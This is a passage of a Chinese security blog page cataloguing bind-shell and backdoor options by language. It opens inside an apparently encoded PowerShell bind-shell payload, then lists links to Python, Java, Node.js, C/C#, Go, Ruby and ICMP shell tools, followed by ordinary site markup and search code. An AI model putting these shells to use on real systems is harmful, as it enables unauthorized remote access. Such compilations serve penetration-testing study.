AGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgBlAHMAdQBsAHQAIgA7AA0ACgAJAAkAfQANAAoACQB9AA0ACgB9AA0ACgA&#x3D;</span><br><span class="line">#点击后运行后需要手动交互输入端口号。考虑修改文件，bind固定端口。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x06-python"><a href="#0x06-python" class="headerlink" title="0x06 python"></a>0x06 python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#Windows正向绑定shell和反向反弹shell的Python代码参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;KevinGeorge&#x2F;p&#x2F;9780151.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x07-Java"><a href="#0x07-Java" class="headerlink" title="0x07 Java"></a><strong>0x07 Java</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaBindShell #Java 正向连接后门：https:&#x2F;&#x2F;github.com&#x2F;melardev&#x2F;JavaBindShell#支持windows与linux</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="0x08-NodeJs"><a href="#0x08-NodeJs" class="headerlink" title="0x08 NodeJs"></a><strong>0x08 NodeJs</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#JSgen</span><br><span class="line">#生成Node.js中的SSJI绑定和反向转换外壳JS代码生成器https:&#x2F;&#x2F;pentesterslife.blog&#x2F;2018&#x2F;06&#x2F;28&#x2F;jsgen&#x2F;https:&#x2F;&#x2F;gitlab.com&#x2F;0x4ndr3&#x2F;blog&#x2F;blob&#x2F;master&#x2F;JSgen&#x2F;JSgen.py</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x09-C-CPP-CSharp"><a href="#0x09-C-CPP-CSharp" class="headerlink" title="0x09 C-CPP-CSharp"></a>0x09 C-CPP-CSharp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C_Win32</span><br><span class="line">BindShellhttps:&#x2F;&#x2F;github.com&#x2F;melardev&#x2F;C_Win32BindShell</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CppQtBindShell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;melardev&#x2F;CppQtBindShell</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.NetCSharpBindShell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;melardev&#x2F;.NetCSharpBindShell</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="0x10-golang"><a href="#0x10-golang" class="headerlink" title="0x10 golang"></a><strong>0x10 golang</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GoBindShell </span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;melardev&#x2F;GoBindShell简单的golang跨平台bind shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x11-ruby"><a href="#0x11-ruby" class="headerlink" title="0x11 ruby"></a><strong>0x11 ruby</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ruby-Bind-and-Reverse-Shells</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Hood3dRob1n&#x2F;Ruby-Bind-and-Reverse-Shells#未进行测试，理论上支持跨平台</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x12-icmp-bindshell"><a href="#0x12-icmp-bindshell" class="headerlink" title="0x12 icmp-bindshell"></a>0x12 icmp-bindshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#基于ICMP正向绑定shell的python3.x脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dc401&#x2F;icmp-bindshell#过于复杂，未进行测试</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/12/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/1/" rel="next" title="字符串解码那些事儿/1">
+                <i class="fa fa-chevron-left"></i> 字符串解码那些事儿/1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/20/java/1/1/" rel="prev" title="java/1/1">
+                java/1/1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/user.jpg"
+                alt="Virusday" />
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/07/19/java/java%E9%80%86%E5%90%91/1/" title="java/java逆向/1" target="_blank">java/java逆向/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/07/15/%E8%BF%87d%E7%9B%BE%E5%B0%8F%E9%A9%AC%E5%88%86%E6%9E%90/1/" title="过d盾小马分析/1" target="_blank">过d盾小马分析/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/" title="java/shiro配合spring/1" target="_blank">java/shiro配合spring/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/06/15/java/el%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8ESPel%E8%A1%A8%E8%BE%BE%E5%BC%8F/1/" title="java/el表达式与SPel表达式/1" target="_blank">java/el表达式与SPel表达式/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/" title="java/java命令执行底层/1" target="_blank">java/java命令执行底层/1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-简介"><span class="nav-number">1.</span> <span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-正片"><span class="nav-number">2.</span> <span class="nav-text">0x01 正片</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-RDP-GUI"><span class="nav-number">2.0.1.</span> <span class="nav-text">0x01 RDP GUI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-telnet远程连接"><span class="nav-number">2.0.2.</span> <span class="nav-text">0x02 telnet远程连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-VNC-GUI"><span class="nav-number">2.0.3.</span> <span class="nav-text">0x03 VNC GUI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-netcat正向shell"><span class="nav-number">2.0.4.</span> <span class="nav-text">0x04 netcat正向shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-powershell-bind"><span class="nav-number">2.0.5.</span> <span class="nav-text">0x05 powershell bind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-python"><span class="nav-number">2.0.6.</span> <span class="nav-text">0x06 python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-Java"><span class="nav-number">2.0.7.</span> <span class="nav-text">0x07 Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-NodeJs"><span class="nav-number">2.0.8.</span> <span class="nav-text">0x08 NodeJs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-C-CPP-CSharp"><span class="nav-number">2.0.9.</span> <span class="nav-text">0x09 C-CPP-CSharp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-golang"><span class="nav-number">2.0.10.</span> <span class="nav-text">0x10 golang</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-ruby"><span class="nav-number">2.0.11.</span> <span class="nav-text">0x11 ruby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-icmp-bindshell"><span class="nav-number">2.0.12.</span> <span class="nav-text">0x12 icmp-bindshell</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">90.8k</span>
+  
+</div>
+-->
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
